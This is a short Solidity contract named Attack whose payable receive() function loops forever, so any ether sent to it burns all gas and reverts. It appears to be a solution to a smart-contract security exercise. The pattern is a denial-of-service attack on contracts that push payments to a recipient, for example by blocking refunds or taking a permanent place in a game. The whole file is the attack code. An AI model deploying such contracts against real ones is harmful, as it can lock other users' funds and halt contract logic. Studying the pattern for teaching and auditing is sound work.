// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Attack {
    uint256 dummyIdx;

    receive() external payable {
        uint256 i = 1;
        while (i == 1) {
            dummyIdx = dummyIdx + 1;
        }
    }
}
